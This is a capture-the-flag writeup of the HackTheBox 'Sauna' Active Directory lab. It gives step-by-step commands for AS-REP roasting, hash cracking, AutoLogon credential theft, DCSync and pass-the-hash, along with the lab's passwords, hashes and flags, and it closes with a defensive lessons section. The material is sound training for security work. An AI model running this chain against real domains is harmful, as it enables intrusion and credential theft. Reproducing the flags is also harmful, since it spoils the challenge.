# 🧖 Sauna — HackTheBox Writeup

> **Platform:** HackTheBox
> **Difficulty:** Easy
> **OS:** Windows Server 2019 — Active Directory Domain Controller
> **Author:** [Tanvir Ahmed](https://github.com/Tanvir-2) | [Portfolio](https://tanvirkarim.it)
> **Status:** ✅ Completed
> **Tags:** `Active Directory` `OSINT` `username-anarchy` `AS-REP Roasting` `Kerberos` `WinRM` `WinPEAS` `AutoLogon` `DCSync` `Pass-the-Hash` `Domain Compromise`

---

## 📋 Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [Username Harvesting (OSINT)](#username-harvesting-osint)
4. [AS-REP Roasting](#as-rep-roasting)
5. [Cracking the Hash](#cracking-the-hash)
6. [Initial Access](#initial-access)
7. [Privilege Escalation — AutoLogon Credentials](#privilege-escalation--autologon-credentials)
8. [DCSync Attack](#dcsync-attack)
9. [Domain Admin — Pass-the-Hash](#domain-admin--pass-the-hash)
10. [Flags](#flags)
11. [Attack Chain](#-attack-chain)
12. [Skills Demonstrated](#-skills-demonstrated)
13. [Lessons Learned](#-lessons-learned)
14. [References](#references)
15. [Tools Used](#tools-used)

---

## 🏛️ Lab Overview

| Field | Details |
|-------|---------|
| **Target IP** | `10.129.95.180` |
| **Hostname** | `SAUNA` |
| **Domain** | `EGOTISTICAL-BANK.LOCAL` |
| **OS** | Windows Server 2019 (Build 17763) — Domain Controller |
| **Difficulty** | Easy |
| **Focus Areas** | OSINT username generation, AS-REP Roasting, credential reuse, DCSync |

**Lab Summary:**
Sauna is an Active Directory box that begins with harvesting employee names from the "Egotistical Bank" website and transforming them into likely usernames. One account has Kerberos pre-authentication disabled, enabling an **AS-REP Roast** that yields a crackable hash. The recovered credentials grant a WinRM foothold. WinPEAS surfaces **AutoLogon credentials** in the registry; a password-reuse pivot reaches the `svc_loanmgr` service account, which holds **DCSync** rights. Dumping the Administrator hash and replaying it (pass-the-hash) delivers full domain compromise.

---

## 🔍 Reconnaissance

### Port Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 10.129.95.180
```

<img width="1141" height="728" alt="image" src="https://github.com/user-attachments/assets/10563265-53dc-4a42-9ce3-d04c75de1e39" />


### Results

| Port | Service | Details |
|------|---------|---------|
| 53/tcp | domain | Simple DNS Plus |
| 80/tcp | http | Microsoft IIS 10.0 — "Egotistical Bank :: Home" |
| 88/tcp | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | NetBIOS Session Service |
| 389/tcp | ldap | AD LDAP — Domain: `EGOTISTICAL-BANK.LOCAL` |
| 445/tcp | microsoft-ds | SMB |
| 464/tcp | kpasswd5 | Kerberos password change |
| 593/tcp | ncacn_http | RPC over HTTP 1.0 |
| 636/tcp | ldaps | LDAP over SSL |
| 3268/3269 | ldap/ldaps | Global Catalog |
| 5985/tcp | http | WinRM (Microsoft HTTPAPI 2.0) |
| 9389/tcp | mc-nmf | .NET Message Framing (AD Web Services) |

**Confirmed:** Domain Controller for `EGOTISTICAL-BANK.LOCAL`, plus an IIS website on port 80. Add the domain to `/etc/hosts`:

```bash
echo "10.129.95.180 EGOTISTICAL-BANK.LOCAL" | sudo tee -a /etc/hosts
```

---

## 🕵️ Username Harvesting (OSINT)

### Website — Meet the Team

Browsing `http://10.129.95.180` reveals the "Egotistical Bank" site with a **"Meet the Team"** section listing employee full names:

<img width="1102" height="763" alt="image" src="https://github.com/user-attachments/assets/01c76d57-a799-4dac-aceb-40d014622f7d" />


```
Fergus Smith    Shaun Coins     Bowie Taylor
Sophie Driver   Hugo Bear       Steven Kerb
```

### Generate Username Permutations

Real AD usernames follow naming conventions (`fsmith`, `smith.f`, `fergus.smith`…). [username-anarchy](https://github.com/urbanadventurer/username-anarchy) generates every common permutation from the harvested names:

```bash
./username-anarchy Fergus Smith > newusers.txt
# repeat / combine for all employees
```

<img width="1588" height="658" alt="image" src="https://github.com/user-attachments/assets/5afb5af3-dba4-42d0-9383-f557edc27434" />


> **💡 Why this matters:** AD attacks need valid usernames before anything else. The team page handed over the raw material; username-anarchy converted it into a candidate list for Kerberos attacks.

---

## 🎟️ AS-REP Roasting

If an account has **"Do not require Kerberos pre-authentication"** set, the KDC will return an AS-REP encrypted with the user's key to *anyone* who asks — no password needed. That response is crackable offline.

```bash
impacket-GetNPUsers -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/ -usersfile newusers.txt
```

<img width="1705" height="488" alt="image" src="https://github.com/user-attachments/assets/a906c1f2-509e-4cfd-a20e-a789e42f5c19" />


The tool returns a `$krb5asrep$` hash for **fsmith** — pre-authentication is disabled on that account. Save the hash to a file (`hashes`).

---

## 🔓 Cracking the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

<img width="1067" height="221" alt="image" src="https://github.com/user-attachments/assets/063c5fcf-51ac-4419-8a7b-2596aee05f85" />


```
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23)
...
Thestrokes23     (fsmith)
```

**Recovered credential:**
```
fsmith : Thestrokes23
```

---

## 🚪 Initial Access

### Validate over WinRM

```bash
nxc winrm 10.129.95.180 -u fsmith -p Thestrokes23
```

<img width="1388" height="201" alt="image" src="https://github.com/user-attachments/assets/eedd92ce-97f4-4874-bd93-0a60f0cc32ef" />


```
WINRM  10.129.95.180  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

### Get a Shell

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```

<img width="1208" height="222" alt="image" src="https://github.com/user-attachments/assets/a060254d-ba47-4d43-bcee-00ec389c4a9d" />


### User Flag

```powershell
C:\Users\FSmith\Desktop> type user.txt
```

<img width="639" height="247" alt="image" src="https://github.com/user-attachments/assets/623f131b-fb40-42da-879f-907b4eebe3ae" />


```
85fdfb2ad6ccc5d24e5b35ef1ca64015
```

---

## 🔺 Privilege Escalation — AutoLogon Credentials

### Enumerate with WinPEAS

Upload and run WinPEAS to sweep the host for common privilege-escalation vectors:

```powershell
C:\Users\FSmith\Desktop> upload winPEASx64.exe
C:\Users\FSmith\Desktop> .\winPEASx64.exe
```

<img width="1631" height="665" alt="image" src="https://github.com/user-attachments/assets/0a3f0e1e-c9d9-4693-a7aa-930c47bb3aaa" />
<img width="802" height="246" alt="image" src="https://github.com/user-attachments/assets/1e6c550d-433c-4c59-aa36-63b5f7711bc2" />


WinPEAS flags **AutoLogon credentials** stored in the registry (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`):

```
DefaultDomainName  :  EGOTISTICAL-BANK
DefaultUserName    :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword    :  Moneymakestheworldgoround!
```

> **🎯 Key Finding:** AutoLogon stores credentials in **cleartext** in the registry — readable by any authenticated user. This leaks a service-account password.

### Password-Reuse Pivot → svc_loanmgr

The leaked username is `svc_loanmanager`, but enumeration shows the actual domain account is **`svc_loanmgr`**. Testing the leaked password against it succeeds — a classic password-reuse win:

```
svc_loanmgr : Moneymakestheworldgoround!
```

---

## 🩸 DCSync Attack

### Map Rights with BloodHound

```bash
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' \
  -ns 10.129.95.180 -d EGOTISTICAL-BANK.LOCAL -c All
```

<img width="1622" height="774" alt="image" src="https://github.com/user-attachments/assets/95f381df-8879-4b01-b95e-edbc8b807617" />
<img width="1556" height="414" alt="image" src="https://github.com/user-attachments/assets/94560e10-85ac-436c-ba19-73091bd59f28" />



BloodHound reveals that **`svc_loanmgr` holds `GetChanges` / `GetChangesAll` rights** on the domain — the replication permissions required for a **DCSync** attack. This account can ask the DC to replicate *any* user's credentials, including the Administrator's.

### Dump the Administrator Hash

```bash
impacket-secretsdump egotistical-bank/svc_loanmgr@10.129.95.180 -just-dc-user Administrator
```

<img width="1001" height="336" alt="image" src="https://github.com/user-attachments/assets/34044c2c-a642-4012-a0d3-8abdbdf552c7" />


```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
```

**Administrator NT hash:**
```
823452073d75b9d1cf70ebdf86c7f98e
```

---

## 👑 Domain Admin — Pass-the-Hash

No cracking required — replay the NT hash directly over WinRM:

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

<img width="1128" height="273" alt="image" src="https://github.com/user-attachments/assets/d0c8b7e7-6329-411f-a986-bbc4b6101ffe" />


### Root Flag

```powershell
C:\Users\Administrator\Desktop> type root.txt
```

<img width="643" height="261" alt="image" src="https://github.com/user-attachments/assets/6a79f01a-bbc4-4faf-95f5-bda7e3bdbb49" />


```
070f531c1431dba8eedb6fc83fe2efd4
```

> **🏆 Full domain compromise** — Administrator on the Domain Controller.

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| **user.txt** | `C:\Users\FSmith\Desktop\user.txt` | `85fdfb2ad6ccc5d24e5b35ef1ca64015` |
| **root.txt** | `C:\Users\Administrator\Desktop\root.txt` | `070f531c1431dba8eedb6fc83fe2efd4` |

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        SAUNA — ATTACK CHAIN                            │
└─────────────────────────────────────────────────────────────────────────┘

[Attacker 10.10.x.x]
        │
        │ 1. Nmap → DC for EGOTISTICAL-BANK.LOCAL + IIS site :80
        ▼
[Website :80 — "Egotistical Bank"]
        │
        │ 2. "Meet the Team" → employee full names
        │ 3. username-anarchy → newusers.txt (username permutations)
        ▼
[Kerberos :88 — AS-REP Roasting]
        │
        │ 4. impacket-GetNPUsers -usersfile newusers.txt
        │        → fsmith has pre-auth DISABLED → $krb5asrep$ hash
        │ 5. john --wordlist=rockyou.txt → fsmith : Thestrokes23
        ▼
[Initial Access — WinRM]
        │
        │ 6. nxc winrm validate → (Pwn3d!)
        │ 7. evil-winrm -u fsmith -p Thestrokes23
        │ 8. user.txt → 85fdfb2ad6ccc5d24e5b35ef1ca64015
        ▼
[Privilege Escalation — AutoLogon]
        │
        │ 9. upload + run winPEAS
        │ 10. AutoLogon registry creds (cleartext):
        │        svc_loanmanager : Moneymakestheworldgoround!
        │ 11. Password reuse → svc_loanmgr : Moneymakestheworldgoround!
        ▼
[DCSync — svc_loanmgr]
        │
        │ 12. bloodhound-python → svc_loanmgr has GetChanges/GetChangesAll
        │ 13. impacket-secretsdump -just-dc-user Administrator
        │        → Administrator NT hash: 823452073d75b9d1cf70ebdf86c7f98e
        ▼
[Domain Admin — Pass-the-Hash]
        │
        │ 14. evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
        │ 15. root.txt → 070f531c1431dba8eedb6fc83fe2efd4
        ▼
[🏆 DOMAIN PWNED]
```

---

## 🛡️ Skills Demonstrated

| # | Skill | MITRE ATT&CK Technique | TTP ID |
|---|-------|------------------------|--------|
| 1 | Port scanning & DC identification | Network Service Discovery | T1046 |
| 2 | OSINT — harvesting employee names | Gather Victim Identity Information | T1589 |
| 3 | Username enumeration / permutation | Account Discovery: Domain Account | T1087.002 |
| 4 | AS-REP Roasting | Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 |
| 5 | Offline hash cracking (John) | Brute Force: Password Cracking | T1110.002 |
| 6 | WinRM remote access | Remote Services: Windows Remote Management | T1021.006 |
| 7 | Automated privilege-esc enumeration (WinPEAS) | System Information Discovery | T1082 |
| 8 | AutoLogon credential recovery | Unsecured Credentials: Credentials in Registry | T1552.002 |
| 9 | Password-reuse pivot | Valid Accounts: Domain Accounts | T1078.002 |
| 10 | AD rights mapping (BloodHound) | Permission Groups Discovery: Domain Groups | T1069.002 |
| 11 | DCSync — credential replication | OS Credential Dumping: DCSync | T1003.006 |
| 12 | Pass-the-Hash → Domain Admin | Use Alternate Auth Material: Pass-the-Hash | T1550.002 |

---

## 📚 Lessons Learned

### 🔴 Offensive Perspective

1. **Public websites are username factories.** The whole chain started with a "Meet the Team" page. Full names + a naming convention + username-anarchy = a validated username list, which is the entry ticket for every Kerberos attack.

2. **AS-REP Roasting needs no credentials.** Any account with "Do not require Kerberos pre-authentication" set leaks a crackable hash to an unauthenticated attacker. Always run `GetNPUsers` against a discovered user list early — it's a zero-cost check that frequently pays off.

3. **WinPEAS earns its keep on Windows.** AutoLogon credentials sit in cleartext in the registry and are a classic, high-value WinPEAS finding. Always run automated enumeration before manual digging — it surfaces the obvious wins fast.

4. **Service-account naming is predictable.** `svc_loanmanager` vs `svc_loanmgr` — the leaked name wasn't exact, but the password was reused. Always test recovered passwords against *similar* account names, not just the literal string.

5. **DCSync is the endgame primitive.** Any principal with `GetChanges` + `GetChangesAll` can replicate the Administrator's hash without ever touching the DC's disk. BloodHound makes spotting these rights trivial — always check replication permissions on any account you control.

### 🔵 Defensive Perspective

1. **Require Kerberos pre-authentication on every account.** Disabling it (often a legacy-app workaround) exposes the account to AS-REP Roasting. Audit for `DONT_REQ_PREAUTH` and remove it wherever it isn't strictly required.

2. **Never use AutoLogon.** It stores credentials in cleartext in the registry. If unavoidable, use a heavily restricted account and rotate frequently. Prefer alternatives like gMSAs that never expose a readable password.

3. **Enforce strong, unique service-account passwords.** `Thestrokes23` and `Moneymakestheworldgoround!` both fell to rockyou/dictionary logic and reuse. Use **group Managed Service Accounts (gMSAs)** with automatic 120-character rotation to eliminate crackable, reused secrets entirely.

4. **Tightly control replication rights.** `GetChanges`/`GetChangesAll` should belong only to DCs and explicitly required accounts. Audit these ACLs regularly and alert on DCSync-style DRSUAPI replication from non-DC hosts.

5. **Minimise information disclosure.** Consider whether full employee names need to be public, and monitor for AS-REP request bursts and anomalous Kerberos activity that signal roasting.

### 🟡 Key Takeaways

- **OSINT → Kerberos is the canonical AD entry path** — names become usernames become hashes become shells.
- **AS-REP Roasting and Kerberoasting are mandatory early checks** on any engagement with a discovered user list.
- **Cleartext credentials hide in Windows internals** — AutoLogon, unattend files, registry, and saved sessions.
- **DCSync + Pass-the-Hash turn one over-privileged service account into full domain ownership** — the last two steps needed no password at all.

---

## 📎 References

| Resource | URL |
|----------|-----|
| username-anarchy | https://github.com/urbanadventurer/username-anarchy |
| Impacket | https://github.com/fortra/impacket |
| BloodHound | https://github.com/SpecterOps/BloodHound |
| WinPEAS (PEASS-ng) | https://github.com/peass-ng/PEASS-ng |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| MITRE ATT&CK — AS-REP Roasting | https://attack.mitre.org/techniques/T1558/004/ |
| MITRE ATT&CK — DCSync | https://attack.mitre.org/techniques/T1003/006/ |
| MITRE ATT&CK — Credentials in Registry | https://attack.mitre.org/techniques/T1552/002/ |
| HackTheBox — Sauna | https://www.hackthebox.com/ |

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and DC identification |
| Web browser | OSINT — harvesting employee names |
| `username-anarchy` | Generating username permutations |
| `impacket-GetNPUsers` | AS-REP Roasting |
| `john` | Offline AS-REP hash cracking |
| `netexec (nxc)` | WinRM credential validation |
| `evil-winrm` | WinRM shell + Pass-the-Hash access |
| `winPEAS` | Automated Windows privilege-escalation enumeration |
| `bloodhound-python` | AD rights/ACL mapping |
| `impacket-secretsdump` | DCSync — dumping the Administrator hash |

---

<div align="center">

**[⬅ Back to Portfolio](https://github.com/Tanvir-2) | [🌐 tanvirkarim.it](https://tanvirkarim.it)**

*Sauna — HackTheBox | Easy | Active Directory: AS-REP Roast → DCSync → Domain Admin*

</div>
